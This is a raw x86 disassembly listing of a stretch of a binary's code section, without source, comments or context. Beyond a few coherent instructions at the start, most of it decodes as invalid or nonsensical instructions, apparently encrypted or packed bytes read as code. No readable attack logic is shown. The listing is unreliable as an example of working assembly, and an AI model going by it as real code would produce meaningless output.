  40d6ea:	cmp    eax,0xbfd092e7
  40d6ef:	std    
  40d6f0:	add    al,0x7
  40d6f2:	or     ch,BYTE PTR [eax-0x7b]
  40d6f5:	lods   al,BYTE PTR ds:[esi]
  40d6f6:	loope  0x40d72b
  40d6f8:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d6fe:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d704:	enter  0x850f,0x1e
  40d708:	cli    
  40d709:	(bad)  
  40d70a:	dec    DWORD PTR [ebx+0x5e9de]
  40d710:	add    BYTE PTR [eax],al
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	add    ebx,ebp
  40d73e:	inc    esp
  40d73f:	mov    BYTE PTR [ecx],al
  40d741:	cmp    BYTE PTR [esi+0x7e],0x3f
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d7bc
  40d749:	jg     0x40d6fd
  40d74b:	pop    eax
  40d74c:	dec    edi
  40d74d:	nop
  40d74e:	fidivr DWORD PTR [ebx+0x11f33cf]
  40d754:	cmp    ebx,DWORD PTR [edi+edi*8]
  40d757:	xor    ebp,DWORD PTR [ebp+0x58]
  40d75a:	mov    esi,DWORD PTR [esi-0x70d9441b]
  40d760:	adc    BYTE PTR [eax+0x28],bh
  40d763:	shl    DWORD PTR [ebx-0x49d56784],0x63
  40d76a:	out    dx,al
  40d76b:	or     DWORD PTR [ebx],ebx
  40d76d:	sti    
  40d76e:	mov    ebp,0xeb77968a
  40d773:	cmp    al,0x1b
  40d775:	popf   
  40d776:	push   eax
  40d777:	xor    dh,BYTE PTR [ebx]
  40d779:	fcom   st(3)
  40d77b:	iret   
  40d77c:	pop    ds
  40d77d:	adc    al,0xcf
  40d77f:	and    BYTE PTR [ebx-0x7a467610],ah
  40d785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d786:	mov    ch,0x27
  40d788:	mov    esp,0xa6775a43
  40d78d:	or     cl,BYTE PTR ds:0x49b79b8f
  40d793:	mov    ds:0x9f5dbd22,al
  40d798:	jle    0x40d784
  40d79a:	pop    eax
  40d79b:	inc    ebx
  40d79c:	pushf  
  40d79d:	and    DWORD PTR [ebx+0x40e18229],edi
  40d7a3:	push   ds
  40d7a4:	add    cl,BYTE PTR [edi-0x5f46a5cb]
  40d7aa:	into   
  40d7ab:	jmp    0x40d7e6
  40d7ad:	mov    WORD PTR [bx+di+0x5bef],?
  40d7b2:	cmp    DWORD PTR [eax-0x1b],edx
  40d7b5:	int    0xec
  40d7b7:	out    dx,al
  40d7b8:	stos   BYTE PTR es:[edi],al
  40d7b9:	adc    DWORD PTR [eax+ebx*2+0x1d],esp
  40d7bd:	jmp    0x8c67:0xad0f5ec3
  40d7c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c5:	xchg   ebp,eax
  40d7c6:	xchg   DWORD PTR [eax],esi
  40d7c8:	pop    ds
  40d7c9:	add    al,0xfc
  40d7cb:	dec    ebp
  40d7cc:	in     al,0x8d
  40d7ce:	cld    
  40d7cf:	dec    edi
  40d7d0:	test   edi,0x6997bfd3
  40d7d6:	mov    ah,0x7f
  40d7d8:	cdq    
  40d7d9:	jge    0x40d7fd
  40d7db:	and    DWORD PTR [esi],edx
  40d7dd:	mov    al,0xb1
  40d7df:	lea    esi,[ebx+0x46]
  40d7e2:	inc    esp
  40d7e3:	push   ebp
  40d7e4:	sub    eax,0x845b21f9
  40d7e9:	dec    esi
  40d7ea:	lock push eax
  40d7ec:	test   BYTE PTR [ecx+0x22c4f660],ch
  40d7f2:	aad    0x85
  40d7f4:	out    dx,al
  40d7f5:	push   ebp
  40d7f6:	mov    edx,0xa1949bd7
  40d7fb:	mov    ebp,0xbf9b5b2f
  40d800:	cli    
  40d801:	out    dx,eax
  40d802:	push   esp
  40d803:	addr16 cmp al,0x3a
  40d806:	mov    eax,0xd0ff0e06
  40d80b:	adc    dl,BYTE PTR [eax+0x722f3fc3]
  40d811:	push   0xffffffc0
  40d813:	xchg   BYTE PTR [ebp-0x23],bl
  40d816:	push   0x63
  40d818:	inc    esi
  40d819:	daa    
  40d81a:	mov    ebx,0xd4f6b6a5
  40d81f:	rcr    BYTE PTR [edx-0x9],cl
  40d822:	sti    
  40d823:	shl    BYTE PTR [ebp+0x61b97049],cl
  40d829:	(bad)  
  40d82b:	lea    edi,[edi]
  40d82d:	aam    0xc7
  40d82f:	inc    esp
  40d830:	mov    WORD PTR [eax+0x3cf7c435],es
  40d836:	inc    esi
  40d837:	fst    QWORD PTR [ebp+0x67a6d42a]
  40d83d:	pop    ebx
  40d83e:	sbb    BYTE PTR [edx],bl
  40d840:	cmp    ch,BYTE PTR [edi-0x2c]
  40d843:	pop    eax
  40d844:	inc    edx
  40d845:	xchg   edx,eax
  40d846:	sbb    DWORD PTR [edi],edx
  40d848:	sti    
  40d849:	das    
  40d84a:	pop    ebx
  40d84b:	xor    al,0x9b
  40d84d:	push   ds
  40d84e:	xor    DWORD PTR [ebx+eiz*1-0x5a],edi
  40d852:	jo     0x40d8c0
  40d854:	(bad)  
  40d855:	enter  0xb59d,0x99
  40d859:	sbb    BYTE PTR [ecx+0x62],bl
  40d85c:	popa   
  40d85d:	cwde   
  40d85e:	sar    DWORD PTR [ebp+0x65],0xa
  40d862:	jp     0x40d810
  40d864:	jl     0x40d846
  40d866:	push   ecx
  40d867:	dec    edi
  40d868:	cmp    DWORD PTR [edx-0x38],esp
  40d86b:	std    
  40d86c:	jb     0x40d831
  40d86e:	cwde   
  40d86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d870:	mov    cl,BYTE PTR [ebx-0x50]
  40d873:	cmp    eax,0x3527fdc6
  40d878:	(bad)  
  40d879:	mov    ch,0x8b
  40d87b:	push   ds
  40d87c:	jg     0x40d8dd
  40d87e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d87f:	adc    al,0xae
  40d881:	pop    esi
  40d882:	sar    BYTE PTR [esi],0x5c
  40d885:	out    0xa,eax
  40d887:	imul   esi,ecx,0xffffffff
  40d88a:	shl    DWORD PTR [ebx],cl
  40d88c:	fucomi st,st(1)
  40d88e:	pop    ecx
  40d88f:	add    DWORD PTR [eax],eax
  40d891:	add    dh,dh
  40d893:	arpl   WORD PTR [ebp+esi*2+0x7d97c57d],dx
  40d89a:	imul   eax,DWORD PTR [edx],0x51
  40d89d:	mov    ebp,DWORD PTR [esi+ecx*1+0x41]
  40d8a1:	std    
  40d8a2:	ret    0x7e81
  40d8a5:	jle    0x40d8e6
  40d8a7:	jg     0x40d927
  40d8a9:	jle    0x40d856
  40d8ab:	mov    ds:0x85b4addc,eax
  40d8b0:	aas    
  40d8b1:	mov    fs:0xe0c7c42f,eax
  40d8b7:	and    BYTE PTR [ecx],0xbd
  40d8ba:	pop    ebx
  40d8bb:	out    dx,eax
  40d8bc:	pop    es
  40d8bd:	sbb    BYTE PTR [esi],al
  40d8bf:	sbb    edx,DWORD PTR [ecx]
  40d8c1:	mov    ss,ebx
  40d8c3:	pop    ss
  40d8c4:	xchg   ebx,eax
  40d8c5:	into   
  40d8c6:	sbb    al,0x60
  40d8c8:	cmp    al,0x5a
  40d8ca:	xor    eax,0x88cb3fc2
  40d8cf:	mov    bl,0x3f
  40d8d1:	repnz cmp DWORD PTR [ebx-0x15],edx
  40d8d5:	fisub  DWORD PTR [ecx+edx*1]
  40d8d8:	dec    ecx
  40d8da:	and    al,0xf9
  40d8dc:	or     ch,BYTE PTR [edi+0x72]
  40d8df:	loop   0x40d867
  40d8e1:	aam    0x67
  40d8e3:	ss dec esp
  40d8e5:	ds cli 
  40d8e7:	nop
  40d8e8:	push   ds
  40d8e9:	popf   
  40d8ea:	add    esp,DWORD PTR [edx-0x79]
  40d8ed:	xor    ch,BYTE PTR [ebp-0x58130a45]
  40d8f3:	add    bh,BYTE PTR [ebp+0x3ac48b68]
  40d8f9:	lahf   
  40d8fa:	and    eax,0x50066399
  40d8ff:	mov    ds:0x2f79e79e,eax
  40d904:	push   ebp
  40d905:	enter  0x7049,0xe8
  40d909:	push   0x1ae96c1e
  40d90e:	push   eax
  40d90f:	xchg   edi,eax
  40d910:	mov    eax,ds:0x50e188b3
  40d915:	mov    al,0x84
  40d917:	fstp   QWORD PTR [eax+0x7f6aa8f1]
  40d91d:	mov    eax,ds:0xfe91c603
  40d922:	sti    
  40d923:	out    dx,al
  40d924:	lods   eax,DWORD PTR ds:[esi]
  40d925:	mov    DWORD PTR [ebx],edi
  40d927:	int3   
  40d928:	push   es
  40d929:	imul   ecx,DWORD PTR [ecx+0x45],0xbc8886d4
  40d930:	xchg   bl,ch
  40d932:	mov    esp,0xffcce3c4
  40d937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d938:	add    esp,DWORD PTR [edx]
  40d93a:	xchg   ebx,eax
  40d93b:	mov    dl,BYTE PTR [eax-0x3daa59b9]
  40d941:	push   es
  40d942:	pop    ebx
  40d943:	sub    al,0x48
  40d945:	out    dx,eax
  40d946:	test   al,0x88
  40d948:	pop    eax
  40d949:	sub    dl,bh
  40d94b:	cmp    eax,0xa9f06bc5
  40d950:	paddw  mm7,QWORD PTR [edx+0x341b46b8]
  40d957:	add    al,0xa0
  40d959:	dec    edx
  40d95a:	outs   dx,DWORD PTR ds:[esi]
  40d95b:	loopne 0x40d9c5
  40d95d:	test   DWORD PTR [ebp-0x4e80c083],edx
  40d963:	ins    BYTE PTR es:[edi],dx
  40d964:	mov    eax,0x96d43646
  40d969:	in     al,dx
  40d96a:	jb     0x40d9d4
  40d96c:	mov    eax,0x93465061
  40d971:	gs push esp
  40d973:	or     al,BYTE PTR [edi+0x4f3f5b46]
  40d979:	push   ebp
  40d97a:	or     BYTE PTR [eax+edi*8-0x7c21e216],0x4e
  40d982:	stos   BYTE PTR es:[edi],al
  40d983:	cmp    DWORD PTR [edx-0x68],0x72
  40d987:	adc    al,0xaf
  40d989:	xlat   BYTE PTR ds:[ebx]
  40d98a:	cmp    BYTE PTR [edx+edi*2],al
  40d98d:	mov    WORD PTR [edx-0x328d99cf],ss
  40d993:	mov    ds:0x266f4e78,eax
  40d998:	jo     0x40d9e3
  40d99a:	scas   al,BYTE PTR es:[edi]
  40d99b:	out    dx,al
  40d99c:	mov    edi,0xbbaa33aa
  40d9a1:	xchg   esi,eax
  40d9a2:	and    esi,DWORD PTR [ebp+0x7e40832b]
  40d9a8:	ret    0xa5b1
  40d9ab:	cmp    DWORD PTR ds:0xaea5288f,0x4b
  40d9b2:	jecxz  0x40d9ff
  40d9b4:	inc    eax
  40d9b5:	mov    ecx,0x964f26ca
  40d9ba:	sub    DWORD PTR [eax-0x7f],esp
  40d9bd:	jge    0x40d96a
  40d9bf:	adc    eax,0xdb2611e4
  40d9c4:	mov    al,ds:0xf9f34167
  40d9c9:	mov    bl,0x8c
  40d9cb:	bound  ecx,QWORD PTR [ebx]
  40d9cd:	or     bl,BYTE PTR [edi-0x19]
  40d9d0:	fimul  WORD PTR [edi-0x6c34696a]
  40d9d6:	adc    al,0x79
  40d9d9:	mov    esi,DWORD PTR [ebx+0x6d067490]
  40d9df:	and    DWORD PTR [eax],ebx
  40d9e1:	mov    edi,0x30cd0c7e
  40d9e6:	inc    dx
  40d9e8:	push   es
  40d9e9:	retf   
  40d9ea:	imul   eax,DWORD PTR [ebx-0x17],0x159
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	xchg   ecx,eax
  40d9fe:	or     BYTE PTR [edx+0x7e8283ca],bl
  40da04:	jle    0x40da45
  40da06:	jg     0x40da86
  40da08:	jle    0x40d9aa
  40da0a:	mov    al,ds:0x37405fde
  40da0f:	xchg   ebx,esp
  40da11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da12:	xor    DWORD PTR [ebp-0x1a],ecx
  40da15:	push   ebp
  40da16:	and    BYTE PTR [esi],dl
  40da18:	inc    ebx
  40da19:	imul   esp,DWORD PTR [eax+ebx*4-0x43],0x5c520992
  40da21:	dec    ebx
  40da22:	xchg   ebx,eax
  40da23:	popf   
  40da24:	push   ecx
  40da25:	pop    ss
  40da26:	aaa    
  40da27:	and    edx,eax
  40da29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da2a:	adc    bl,0xa4
  40da2d:	in     eax,dx
  40da2e:	sahf   
  40da2f:	aad    0x86
  40da31:	push   ss
  40da32:	adc    cl,BYTE PTR [eax-0x4ca8c9e3]
  40da38:	and    DWORD PTR [eax],0x5e
  40da3b:	les    ebx,FWORD PTR [ebx+0x15d7b579]
  40da41:	ds into 
  40da43:	fistp  QWORD PTR [esi+0x4]
  40da46:	rcr    DWORD PTR ds:0xabdc108d,cl
  40da4c:	adc    bh,BYTE PTR [ecx]
  40da4e:	ret    
  40da4f:	out    0xdf,eax
  40da51:	(bad)  
  40da52:	mov    esi,0x3fec6626
  40da57:	popa   
  40da58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da59:	xchg   DWORD PTR [edx-0x28b3bd96],edx
  40da5f:	push   esi
  40da60:	or     BYTE PTR [ebp-0x1f316d58],bh
  40da66:	cmp    edx,DWORD PTR [edi-0x700c3c8b]
  40da6c:	sahf   
  40da6d:	ins    DWORD PTR es:[edi],dx
  40da6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da6f:	sbb    eax,0x4917883b
  40da74:	and    eax,0x81729d2b
  40da79:	push   edx
  40da7a:	and    eax,0x74fc9815
  40da7f:	test   BYTE PTR [ebp-0x21],al
  40da82:	das    
  40da83:	xchg   ebp,eax
  40da84:	xchg   ecx,eax
  40da85:	cwde   
  40da86:	aas    
  40da87:	adc    al,0x7e
  40da89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da8a:	popf   
  40da8b:	(bad)  
  40da8c:	mov    ecx,0x77df8955
  40da91:	test   cl,cl
  40da93:	scas   eax,DWORD PTR es:[edi]
  40da94:	sub    al,0xac
  40da96:	or     edx,edi
  40da98:	add    ch,BYTE PTR [ebx]
  40da9a:	push   esi
  40da9b:	adc    eax,0xf6ae232a
  40daa0:	fsub   DWORD PTR [esi+0x77fe1071]
  40daa6:	test   eax,0x6f4029c2
  40daab:	dec    edi
  40daac:	test   al,0x39
  40daae:	xor    eax,0x57b70026
  40dab3:	and    BYTE PTR [ebp-0x1f],al
  40dab6:	push   ss
  40dab7:	xchg   ebp,eax
  40dab8:	cmp    DWORD PTR [edi+0x73],edx
  40dabb:	cmp    al,0x8b
  40dabd:	nop
  40dabe:	lahf   
  40dabf:	pop    edx
  40dac0:	push   edx
  40dac1:	xchg   esp,eax
  40dac2:	fnstenv [esi+ebx*2]
  40dac5:	sbb    al,0x6d
  40dac7:	cmp    dl,ch
  40dac9:	repz fst DWORD PTR [esi-0x1ae860a1]
  40dad0:	and    DWORD PTR ds:0xf683fa3a,ecx
  40dad6:	jle    0x40db26
  40dad8:	jbe    0x40daa8
  40dada:	call   0x4d9e:0xecbfe8e2
  40dae1:	retf   0x4848
  40dae4:	or     eax,0x4b965154
  40dae9:	imul   edx,DWORD PTR [esi+0x5b],0xe0c956b9
  40daf0:	xchg   ebp,eax
  40daf1:	stos   BYTE PTR es:[edi],al
  40daf2:	loop   0x40dae9
  40daf4:	xchg   DWORD PTR ds:0xcab7991f,ebp
  40dafa:	cli    
  40dafb:	icebp  
  40dafc:	jae    0x40dae4
  40dafe:	mov    bl,0x6a
  40db01:	add    DWORD PTR [ecx+0x15c2bf11],edi
  40db07:	lea    edx,[edx]
  40db09:	inc    ebx
  40db0a:	mov    ebx,0x41ce8db0
  40db0f:	ret    0xfba2
  40db12:	mov    ch,0xf7
  40db14:	lahf   
  40db15:	jmp    0x8d52a75c
  40db1a:	ret    0xda4
  40db1d:	ficomp DWORD PTR [esi]
  40db1f:	push   ebx
  40db20:	sub    edx,DWORD PTR [eax-0x20]
  40db23:	jmp    0xba6eb71b
  40db28:	push   edi
  40db29:	adc    BYTE PTR [ebx-0x3ddb81ea],bh
  40db2f:	js     0x40db48
  40db31:	inc    esi
  40db32:	(bad)  
  40db33:	out    dx,al
  40db34:	idiv   BYTE PTR [eax]
  40db36:	aaa    
  40db37:	sbb    bl,BYTE PTR ds:0x156e68c1
  40db3d:	in     al,dx
  40db3e:	push   ss
  40db3f:	sub    BYTE PTR [ebx+0x6782f5f2],al
  40db45:	in     eax,0xee
  40db47:	stc    
  40db48:	iret   
  40db49:	into   
  40db4a:	cmp    DWORD PTR [ebp+0x10],ebx
  40db4d:	je     0x40df85
  40db53:	jmp    0x40dcb1
  40db58:	xchg   ebp,eax
  40db59:	mov    BYTE PTR [esi-0x42c354e4],bl
  40db5f:	mov    ecx,0xd105ab5
  40db64:	push   eax
  40db66:	fld    DWORD PTR [ebx]
  40db68:	inc    esp
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40dbde
  40db71:	xchg   ebp,eax
  40db72:	inc    esp
  40db73:	cmp    eax,0xf1203586
  40db78:	add    bh,dh
  40db7a:	push   DWORD PTR ds:0x534b87ec
  40db80:	arpl   WORD PTR [edx],sp
  40db82:	dec    ebp
  40db83:	lods   al,BYTE PTR ds:[esi]
  40db84:	mov    bl,0xbb
  40db86:	out    dx,al
  40db87:	add    BYTE PTR [ebx-0x744f1a47],ch
  40db8d:	cs push ecx
  40db8f:	xor    bl,dh
  40db91:	xchg   edi,eax
  40db92:	shl    DWORD PTR [eax+0x2d9dfb80],cl
  40db98:	out    0xac,al
  40db9a:	mov    cl,0xe4
  40db9c:	fsub   QWORD PTR [edi+0x5c]
  40db9f:	jl     0x40dbb6
  40dba1:	arpl   si,dx
  40dba3:	stc    
  40dba4:	mov    ch,0x2c
  40dba6:	pop    ecx
  40dba7:	mov    dh,0xf
  40dba9:	jg     0x40dba1
  40dbab:	sbb    eax,0xcfa2327
  40dbb0:	push   0x56
  40dbb2:	xchg   BYTE PTR [edi+ebx*8+0x5c9dcdf2],ch
  40dbb9:	dec    edx
  40dbba:	aad    0xad
  40dbbc:	into   
  40dbbd:	out    dx,al
  40dbbe:	call   0xf0b1b4c0
  40dbc3:	imul   DWORD PTR [edx+0x2cea7e08]
  40dbc9:	dec    edx
  40dbca:	test   al,0xd
  40dbcc:	popaw  
  40dbce:	lea    edx,[edi-0x78]
  40dbd1:	arpl   WORD PTR [edi-0x57],sp
  40dbd4:	xor    eax,0xb2164411
  40dbd9:	ja     0x40dc49
  40dbdb:	or     al,0x9f
  40dbdd:	inc    ebp
  40dbde:	jmp    0xd5a7:0x4eff5e7
  40dbe5:	fwait
  40dbe6:	aaa    
  40dbe7:	fidivr DWORD PTR [ebx-0x820fc7a]
  40dbed:	sbb    BYTE PTR [ebp+0x63],ah
  40dbf0:	adc    BYTE PTR [ebx+esi*1+0x572fbe27],al
  40dbf7:	sbb    al,0xf
  40dbf9:	cmp    bh,BYTE PTR [eax]
  40dbfb:	xchg   esp,eax
  40dbfc:	dec    ebx
  40dbfd:	enter  0xf5fb,0x39
  40dc01:	cmp    al,0x77
  40dc03:	mov    esi,0xc7ebb6b6
  40dc08:	in     eax,0x64
  40dc0a:	lods   al,BYTE PTR ds:[esi]
  40dc0b:	ins    BYTE PTR es:[edi],dx
  40dc0c:	pop    esi
  40dc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc0e:	out    0xdb,al
  40dc10:	pop    ds
  40dc11:	inc    eax
  40dc12:	mov    bl,0x78
  40dc14:	mov    bh,0xb
  40dc16:	ss rdmsr 
  40dc19:	enter  0x285e,0xdc
  40dc1d:	mov    al,0xd0
  40dc1f:	add    ebx,DWORD PTR es:[eax+0x203ed0df]
  40dc26:	push   esi
  40dc27:	push   esp
  40dc28:	sub    BYTE PTR [ecx+0x32],bh
  40dc2b:	pop    ds
  40dc2c:	jb     0x40dc01
  40dc2e:	mov    ecx,0x38e4d424
  40dc33:	dec    eax
  40dc34:	push   ebx
  40dc35:	test   al,0xb9
  40dc37:	les    edx,FWORD PTR [ecx+0x5b5f34c1]
  40dc3d:	popf   
  40dc3e:	or     dl,BYTE PTR [edx-0x74]
  40dc41:	sbb    al,0xd4
  40dc43:	or     BYTE PTR [ebx],0x9f
  40dc46:	or     eax,0x18851c55
  40dc4b:	mov    al,ds:0xafdc39b
  40dc50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc51:	in     al,dx
  40dc52:	cmp    dl,dl
  40dc54:	lock retf 
  40dc56:	loope  0x40dc6e
  40dc58:	pop    esi
  40dc59:	mov    bh,0x1b
  40dc5b:	and    DWORD PTR [eax-0x5d],0xa78e343e
  40dc62:	(bad)  [esi-0x39ae1db3]
  40dc68:	mov    esp,0x1a97040b
  40dc6d:	int3   
  40dc6e:	adc    ch,BYTE PTR ds:0x1f05c1f6
  40dc74:	ins    BYTE PTR es:[edi],dx
  40dc75:	stc    
  40dc76:	fld    st(1)
  40dc78:	cmp    esi,ebp
  40dc7a:	inc    ebp
  40dc7b:	sbb    bl,dl
  40dc7d:	or     eax,0x9b670d66
  40dc82:	pop    edx
  40dc83:	xchg   ebp,eax
  40dc84:	pop    esi
  40dc85:	lds    edx,FWORD PTR [edi]
  40dc87:	push   ebp
  40dc88:	inc    edi
  40dc89:	mov    ds:0xaf9d7b21,eax
  40dc8e:	test   BYTE PTR ds:0x28e07c9f,al
  40dc94:	inc    eax
  40dc95:	xchg   esi,eax
  40dc96:	push   ebp
  40dc97:	cs sbb eax,0x1d69e93f
  40dc9d:	inc    DWORD PTR [ebx+0x10e333fc]
  40dca3:	xchg   esp,eax
  40dca4:	or     eax,0x41ef1a1a
  40dca9:	mov    al,ds:0xe84bcebe
  40dcae:	leave  
  40dcaf:	xlat   BYTE PTR ds:[ebx]
  40dcb0:	jl     0x40dc44
  40dcb2:	jmp    0x40de10
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x47853fe9,cl
  40dcc5:	inc    ebp
  40dcc6:	hlt    
  40dcc7:	add    eax,0x3f7e7e85
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dc9b
  40dcd0:	jae    0x40dd38
  40dcd2:	mov    ch,0x5f
  40dcd4:	mov    WORD PTR [ebx],ds
  40dcd6:	addr16 cmp al,0xb8
  40dcd9:	dec    ebx
  40dcda:	int    0xa6
  40dcdc:	lods   al,BYTE PTR ds:[esi]
  40dcdd:	inc    esp
  40dcde:	dec    edx
  40dcdf:	popf   
  40dce0:	call   0x92fca2e3
  40dce5:	jecxz  0x40dd4f
  40dce7:	xor    BYTE PTR [ecx],0x6a
  40dcea:	outs   dx,BYTE PTR ds:[esi]
  40dceb:	retf   0x8b78
  40dcee:	ret    0x8b27
  40dcf1:	cmc    
  40dcf2:	push   edi
  40dcf3:	jg     0x40dd11
  40dcf5:	mov    cl,0xe7
  40dcf7:	(bad)  
  40dcf8:	jl     0x40dd0d
  40dcfa:	outs   dx,BYTE PTR ds:[esi]
  40dcfb:	mov    cl,0xe6
  40dcfd:	retf   
  40dcfe:	adc    cl,BYTE PTR [ebx+0x6e]
  40dd01:	lea    edi,[edx]
  40dd03:	jle    0x40dca7
  40dd05:	ror    BYTE PTR [ebp-0x55],cl
  40dd08:	jns    0x40dd3c
  40dd0a:	and    bl,BYTE PTR [ebx]
  40dd0c:	add    esi,edi
  40dd0e:	hlt    
  40dd0f:	sub    al,0x1f
  40dd11:	push   esp
  40dd12:	pop    esp
  40dd13:	es dec edi
  40dd15:	xchg   esp,eax
  40dd16:	push   ebx
  40dd17:	jns    0x40dd33
  40dd19:	mov    BYTE PTR [edi+0x40],ah
  40dd1c:	(bad)  
  40dd1e:	mov    cl,0x95
  40dd20:	inc    edi
  40dd21:	fild   WORD PTR [edx+ebx*4-0x7b]
  40dd25:	bnd fs jo 0x40dd14
  40dd29:	xchg   ah,bh
  40dd2b:	xchg   esi,eax
  40dd2c:	adc    esp,esi
  40dd2e:	in     eax,dx
  40dd2f:	mov    esi,0x5f934591
  40dd34:	xchg   BYTE PTR ds:[edx-0x2782d054],dh
  40dd3b:	or     DWORD PTR fs:[eax],esi
  40dd3e:	cli    
  40dd3f:	dec    eax
  40dd40:	lahf   
  40dd41:	ret    
  40dd42:	jp     0x40dd43
  40dd44:	jne    0x40dd3b
  40dd46:	mov    dl,0x5d
  40dd48:	test   DWORD PTR [edx+edx*4],ebp
  40dd4b:	xchg   edi,eax
  40dd4c:	sti    
  40dd4d:	mov    edx,0x2bd8b2
  40dd52:	fisttp QWORD PTR [eax+eax*2]
  40dd55:	daa    
  40dd56:	add    ch,BYTE PTR [esi+0x7e17ed6e]
  40dd5c:	loop   0x40ddd5
  40dd5e:	mov    ebp,DWORD PTR [ebx]
  40dd60:	add    dh,bh
  40dd62:	sub    eax,0x438783d3
  40dd67:	stc    
  40dd68:	push   eax
  40dd69:	clc    
  40dd6a:	pusha  
  40dd6b:	mov    dl,0x67
  40dd6d:	int    0xd
  40dd6f:	iret   
  40dd70:	ins    DWORD PTR es:[edi],dx
  40dd71:	outs   dx,DWORD PTR ds:[esi]
  40dd72:	add    DWORD PTR [eax+eiz*1],esi
  40dd75:	(bad)  
  40dd76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd77:	jo     0x40dde4
  40dd79:	adc    al,0xb8
  40dd7b:	repz fst QWORD PTR ds:0xc98d16e1
  40dd82:	jmp    0x2603826d
  40dd87:	xlat   BYTE PTR ds:[ebx]
  40dd88:	call   0x591f1925
  40dd8d:	push   ecx
  40dd8e:	fcomp  st(2)
  40dd90:	push   cs
  40dd91:	ficom  DWORD PTR [ecx+0x3234411c]
  40dd97:	mov    esi,0x52b5ffdf
  40dd9c:	jo     0x40dd2c
  40dd9e:	dec    ebp
  40dd9f:	ss loope 0x40ddff
  40dda2:	sbb    ebp,DWORD PTR [ecx]
  40dda4:	push   0x9368be25
  40dda9:	lds    esi,FWORD PTR [edx+ebp*1]
  40ddac:	daa    
  40ddad:	jp     0x40de0f
  40ddaf:	sub    edx,ebx
  40ddb1:	popf   
  40ddb2:	adc    BYTE PTR [esi],0x19
  40ddb5:	(bad)  
  40ddb8:	and    dl,cl
  40ddba:	dec    eax
  40ddbb:	imul   ebx,DWORD PTR [ebx-0x1a9ed8a9],0xffffffa8
  40ddc2:	dec    edi
  40ddc3:	inc    ecx
  40ddc4:	shl    BYTE PTR [edi+0x29],1
  40ddc7:	pop    DWORD PTR [esp+eax*4+0x7963262b]
  40ddce:	xor    edx,edi
  40ddd0:	ins    BYTE PTR es:[edi],dx
  40ddd1:	pop    esi
  40ddd2:	cdq    
  40ddd3:	fwait
  40ddd4:	mov    eax,ds:0xa64c6cf5
  40ddd9:	les    dx,DWORD PTR [esi+eax*8+0x70367180]
  40dde1:	xor    DWORD PTR [ecx+0x1b],0x7b20c505
  40dde8:	adc    DWORD PTR [ecx-0x39f92e80],ecx
  40ddee:	jmp    0x3819:0xc32f2b81
  40ddf5:	fdivrp st(7),st
  40ddf7:	cmp    ch,BYTE PTR [eax]
  40ddf9:	pop    esp
  40ddfa:	or     BYTE PTR [edx+0x18a7fc49],0x4f
  40de01:	out    dx,eax
  40de02:	mov    edx,0x811f70c3
  40de07:	lock xchg esi,eax
  40de09:	adc    eax,0x6ee04c28
  40de0e:	stos   DWORD PTR es:[edi],eax
  40de0f:	addr16 push 0xa
  40de12:	pop    ecx
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0xbd61c38d
  40de2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de2e:	mov    BYTE PTR [esi+0x7f3f7e7e],0x7e
  40de35:	jle    0x40de7c
  40de37:	push   cs
  40de38:	addr16 push ebp
  40de3a:	call   0xa9a:0x4870dfd5
  40de41:	loope  0x40dde7
  40de43:	push   edx
  40de44:	imul   ebp,DWORD PTR [edx-0x6e],0x18e6a642
  40de4b:	sbb    bl,BYTE PTR [edx+0x18]
  40de4e:	rcl    BYTE PTR [ebp+0x2b40ca7d],0x42
  40de55:	jne    0x40de3d
  40de57:	mov    WORD PTR [edx+edx*2-0x3a960340],es
  40de5e:	std    
  40de5f:	push   edx
  40de60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de61:	in     al,dx
  40de62:	xchg   edx,eax
  40de63:	dec    edx
  40de64:	pop    ebx
  40de65:	sub    eax,0x102fa18c
  40de6a:	ja     0x40de3e
  40de6c:	cmp    eax,0x72a8a161
  40de71:	or     BYTE PTR [edi],0x58
  40de74:	mov    edi,ebp
  40de76:	retf   
  40de77:	aaa    
  40de78:	addr16 and al,0x4d
  40de7b:	xor    DWORD PTR [ebx],ebx
  40de7d:	pop    esi
  40de7e:	xlat   BYTE PTR ds:[ebx]
  40de7f:	pop    ebp
  40de80:	fisttp WORD PTR [ecx-0x4c]
